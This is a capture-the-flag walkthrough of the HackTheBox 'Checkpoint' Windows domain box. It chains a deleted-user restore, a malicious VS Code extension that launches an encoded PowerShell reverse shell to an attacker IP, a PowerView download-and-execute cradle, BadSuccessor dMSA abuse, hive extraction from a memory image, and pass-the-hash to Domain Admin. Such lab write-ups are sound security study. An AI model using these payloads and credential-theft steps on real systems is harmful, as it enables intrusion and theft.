---
title: "Checkpoint (HackTheBox) — Walkthrough: AD Recycle Bin → Malicious VSIX → BadSuccessor → Memory Forensics → DA"
description: "HackTheBox Checkpoint walkthrough — assumed-breach Windows AD chain: restore deleted user, malicious VS Code extension deploy, BadSuccessor dMSA abuse, Volatility3 memory forensics on a VMware snapshot, and pass-the-hash to Domain Admin."
date: 2026-09-16 09:00:00 +0000
categories: [CTF]
tags: [ctf, hackthebox, windows, active-directory, ad-recycle-bin, vsix, badsuccessor, dmsa, memory-forensics, volatility, pass-the-hash, bloodhound]
difficulty: Insane
---

> **Box:** HackTheBox — Checkpoint · **OS:** Windows Server 2025 · **Theme:** Assumed-breach AD → VSIX deploy pipeline → BadSuccessor (dMSA) → VM memory forensics → DA

Assumed-breach Windows AD box (`checkpoint.htb`, single DC on Server 2025). Long chain — the theme is *a leaked VM memory snapshot hands over the DA hash*, but reaching that snapshot takes two lateral hops (a VS Code extension deploy pipeline, then a **BadSuccessor** dMSA abuse) to land on the one service account that can read the backup share. Started with one low-priv cred, ended at root.

- **Box:** `10.129.44.155` (`DC01.checkpoint.htb`)
- **Given creds:** `alex.turner:Checkpoint2024!`

---

## Recon

```bash
└─$ nmap -p- --min-rate 2000 -T4 -oN allports.txt 10.129.44.155
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664,49674,49675,49680,49683,49720/tcp open  msrpc
```

Textbook domain controller — DNS/Kerberos/LDAP/GC plus **WinRM (5985)** and **ADWS (9389)**. Everything runs through `checkpoint.htb` / `DC01`.

---

## alex.turner → mark.davies (AD Recycle Bin)

Validated the given credential:

```bash
└─$ nxc smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
SMB  10.129.44.155  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True)
SMB  10.129.44.155  445  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

`alex.turner` is in **VPN-Users** and **IT-Staff**. Dumped the object — this account can restore deleted AD objects:

```bash
└─$ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object alex.turner
distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
memberOf: CN=VPN-Users,...; CN=IT-Staff,...
sAMAccountName: alex.turner
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
[nTSecurityDescriptor trimmed — grants object-restore rights]
```

A deleted user **Mark Davies** is sitting in the Deleted Objects container. Restored it — a restored account keeps its old password, and here that's the shared `Checkpoint2024!`:

```bash
└─$ bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb \
    set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] ...has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

└─$ nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!'
SMB  10.129.44.155  445  DC01  [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

> Also Kerberoasted `mark.davies` — a TGS came back but didn't crack against rockyou+best64. Dead end, noted.

---

## mark.davies → ryan.brooks (Malicious VS Code Extension)

Two shares stand out:

```
Name        : DevDrop
Path        : C:\Shares\DevDrop
Description : VS Code extensions share for approved .vsix packages (VS Code engine 1.118.0)

Name        : VMBackups
Path        : C:\Shares\VMBackups
```

**DevDrop** is a drop-your-`.vsix`-here share, and a scheduled script `C:\Scripts\vscodesync.ps1` runs **as `ryan.brooks`** on a timer and auto-installs anything dropped there:

```powershell
$shareDir = "C:\Shares\DevDrop"
$vsixFiles = Get-ChildItem -LiteralPath $resolvedShare -Filter *.vsix -File ...
foreach ($vsix in $vsixFiles) {
    & $codeCli --install-extension $vsix.FullName --force 2>&1   # runs as ryan.brooks
}
```

A VS Code extension's `activate()` runs arbitrary Node/`child_process` code on install — so a malicious `.vsix` = code exec as `ryan.brooks`. Built `code-helper.vsix` whose `extension.js` fires a reverse shell on activation:

```javascript
// extension.js (packaged into code-helper.vsix)
const cp = require('child_process');
function run(){ cp.exec('powershell -nop -w hidden -ep bypass -enc <b64 rev shell 10.10.14.165:9001>'); }
function activate(context){ run(); }
module.exports = { activate, deactivate: () => {} };
```

`activationEvents: ["onStartupFinished","*"]` in `package.json` ensures it fires immediately on install. Dropped it in the share:

```bash
smbclient //10.129.44.155/DevDrop -U 'mark.davies%Checkpoint2024!' -c 'put code-helper.vsix'
```

Moments later the deploy job installs it and the payload fires as `ryan.brooks` — shell and user flag:

**User flag:** `b9eebb29df6396c51cfdf64f86ce7a0d`

---

## ryan.brooks → svc_deploy (BadSuccessor / dMSA)

`ryan.brooks` is in **DevTeam**. PowerView shows two abusable ACLs (Defender is off):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.165:8000/PowerView.ps1')
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match 'ryan.brooks' }

# ryan.brooks  CreateChild   OU=DMSAHolder,DC=checkpoint,DC=htb     <-- BadSuccessor
# ryan.brooks  GenericWrite  CN=svc_deploy,OU=ServiceAccounts,...   <-- writable target
```

**CreateChild on `OU=DMSAHolder`** is the textbook setup for **BadSuccessor** — abusing delegated Managed Service Accounts (dMSA) to inherit another principal's Kerberos keys. The attack creates a dMSA in an OU you control, points its *superseded account* link at a victim, and the KDC hands over the victim's keys in the dMSA's TGS ("previous keys").

Got a usable TGT for `ryan.brooks` via `tgtdeleg`, converted to ccache on Kali. Targeting Administrator directly doesn't work on a patched DC without a write on the victim side — but `ryan.brooks` has `GenericWrite` on `svc_deploy`, which makes the two-sided version work:

**`svc_deploy` NT hash:** `e16081eb077aca74bdbf8af12af43ac9`

---

## svc_deploy → VMBackups (Memory Image)

`ryan.brooks` was denied on **VMBackups**, but `svc_deploy` can read it. Inside is a VMware snapshot in a "memory forensics" folder — including a full 2 GB RAM image:

```bash
└─$ smbclient //10.129.44.155/VMBackups -U 'svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash -c 'recurse ON; ls'
  \NightlyBackup_2024-11-01\memory forensics\
    Windows Server 2019-Snapshot1.vmem   2147483648   <-- 2 GB RAM image
    Windows Server 2019-Snapshot1.vmsn    138164859
```

---

## Memory Forensics → Administrator Hash

A VMware `.vmem` is a raw physical memory dump — **Volatility 3** reads it directly. The `windows.hashdump` / `lsadump` / `cachedump` plugins silently dropped out (missing `pycryptodomex`). Rather than fight the plugins, I went lower — dumped the registry hives straight out of RAM and ran `secretsdump` offline:

```bash
# Dump SYSTEM/SAM/SECURITY hives from the memory image
vol -q -f 'Windows Server 2019-Snapshot1.vmem' -o hives windows.registry.hivelist --dump

# Offline extraction
impacket-secretsdump \
    -sam registry.SAM.*.hive \
    -system registry.SYSTEM.*.hive \
    -security registry.SECURITY.*.hive \
    LOCAL
```

The RID 500 `Administrator` NT hash from the captured SAM **matches the live domain Administrator** — that's the whole point of the box.

**Administrator NT hash:** `f29e9c014295b9b32139b09a2790be3b`

---

## Domain Admin → root (PtH + DCSync)

That hash authenticates against the live DC:

```bash
└─$ nxc smb 10.129.44.155 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
SMB  10.129.44.155  445  DC01  [+] checkpoint.htb\Administrator:f29e9c...be3b (Pwn3d!)
```

The root flag lives on `max.palmer`'s Desktop:

```bash
└─$ impacket-wmiexec -hashes :f29e9c014295b9b32139b09a2790be3b checkpoint.htb/Administrator@10.129.44.155 \
    'type C:\Users\max.palmer\Desktop\root.txt'
```

**Root flag:** `71b5b486b561a9e8e0e80d48a779fcb6`

---

## TL;DR

- `alex.turner` (given) → restore deleted **`mark.davies`** via the **AD Recycle Bin** (keeps `Checkpoint2024!`)
- `mark.davies` → drop a malicious **`.vsix`** in DevDrop → `vscodesync.ps1` installs it as **`ryan.brooks`** → user flag
- `ryan.brooks` has CreateChild on `OU=DMSAHolder` + GenericWrite on `svc_deploy` → **BadSuccessor (dMSA)** → `svc_deploy` NT hash
- `svc_deploy` reads **VMBackups** → Server 2019 **`.vmem`** → Volatility3 hive dump + `secretsdump` → **Administrator** NT hash
- **PtH** → DC01 Pwn3d! → DCSync → `root.txt` (on max.palmer's Desktop)
